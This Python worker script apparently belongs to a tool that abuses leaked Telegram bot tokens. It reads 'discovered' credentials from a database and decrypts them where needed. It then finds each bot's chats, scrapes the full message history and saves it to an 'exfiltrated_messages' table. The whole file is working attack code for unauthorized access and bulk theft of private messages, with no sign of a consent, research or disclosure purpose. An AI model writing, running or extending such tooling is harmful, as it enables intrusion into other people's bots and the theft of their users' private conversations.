import asyncio
import sys
import os
import time

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.core.database import db
from app.services.scraper_srv import scraper_service

async def run_manual_worker():
    print("🚀 Starting LOCAL MANUAL WORKER (Scraping Active Credentials)...")
    
    # 1. Fetch Active OR Pending Credentials
    try:
        # Supabase client doesn't support OR nicely in one query typically, but we can try neq 'revoked'
        # Or just two queries.
        response_active = db.table("discovered_credentials").select("*").eq("status", "active").execute()
        response_pending = db.table("discovered_credentials").select("*").eq("status", "pending").execute()
        creds = response_active.data + response_pending.data
    except Exception as e:
        print(f"❌ DB Error: {e}")
        return

    if not creds:
        print("⚠️ No ACTIVE or PENDING credentials found in DB. Run the scanner first!")
        return

    print(f"📋 Found {len(creds)} credentials (Active + Pending) to process.")
    print("-------------------------------------------------")

    total_msgs = 0
    
    from app.core.security import security # Needed for decryption if we do enrichment
    
    for i, cred in enumerate(creds):
        cred_id = cred['id']
        # We might need to decrypt if it's not plain text (Scanners usually save plaintext for token, but flow encrypts it)
        # Actually scanner_tasks saves it as plaintext in 'bot_token' usually? 
        # Wait, scanner_tasks line 116: "bot_token": token.
        # But flow_tasks encrypts it? 
        # Let's assume plaintext first, if it looks encrypted (gAAAA...), try decrypt.
        token = cred['bot_token']
        if token.startswith("gAAAA"):
            try:
                token = security.decrypt(token)
            except:
                print(f"   ❌ Could not decrypt token for {cred_id}, skipping.")
                continue

        chat_id = cred.get('chat_id')
        status = cred.get('status')
        bot_name = cred.get('meta', {}).get('bot_username', 'Unknown')
        
        print(f"\n🔄 [{i+1}/{len(creds)}] Processing Bot: @{bot_name} (ID: {cred_id}) | Status: {status}")
        
        # ENRICHMENT STEP (If pending or no chat_id)
        if not chat_id:
            print("   🔎 Status is Pending/No Chat. Attempting Discovery (Enrichment)...")
            try:
                bot_info, chats = await scraper_service.discover_chats(token)
                if chats:
                    # Take first chat
                    first_chat = chats[0]
                    chat_id = first_chat['id']
                    chat_name = first_chat['name']
                    print(f"   ✅ Discovered Chat: {chat_name} ({chat_id})")
                    
                    # Update DB
                    db.table("discovered_credentials").update({
                        "chat_id": chat_id,
                        "status": "active",
                        "meta": {**cred.get('meta', {}), "chat_name": chat_name}
                    }).eq("id", cred_id).execute()
                    print("   💾 Updated DB to ACTIVE.")
                else:
                    print("   ⚠️ No chats found during discovery. Skipping.")
                    continue
            except Exception as e:
                print(f"   ❌ Discovery failed: {e}")
                continue
        
        print(f"   🎯 Target Chat: {chat_id}")

        try:
            # Scrape History
            print("   ⏳ Scraping history...")
            messages = await scraper_service.scrape_history(token, chat_id)
            print(f"   ✅ Retrieved {len(messages)} messages.")
            
            # Save to DB
            saved_count = 0
            for msg in messages:
                msg["credential_id"] = cred_id
                
                # Sanitize: Remove keys that are not columns in exfiltrated_messages
                # The scraper adds 'chat_id' for tracking, but the table relies on credential_id reference
                msg.pop('chat_id', None) 
                
                try:
                    db.table("exfiltrated_messages").insert(msg).execute()
                    saved_count += 1
                except Exception as e:
                    # Ignore unique constraint errors (duplicates), but print others!
                    if "duplicate key" in str(e) or "unique constraint" in str(e):
                        pass
                    else:
                        print(f"      ❌ Insert Failed for Msg {msg.get('telegram_msg_id')}: {e}")
            
            print(f"   💾 Saved {saved_count} NEW messages to DB.")
            total_msgs += saved_count
            
        except Exception as e:
            print(f"   ❌ Error scraping: {e}")
            # Optional: Mark as revoked/error?
            # db.table("discovered_credentials").update({"status": "error"}).eq("id", cred_id).execute()

        # Slight delay to be nice to Telegram API if processing many
        await asyncio.sleep(1)

    print("\n-------------------------------------------------")
    print(f"🏁 Manual Worker Complete. Total New Messages: {total_msgs}")
    print("   Check the Web Dashboard or Database to view content.")

if __name__ == "__main__":
    asyncio.run(run_manual_worker())
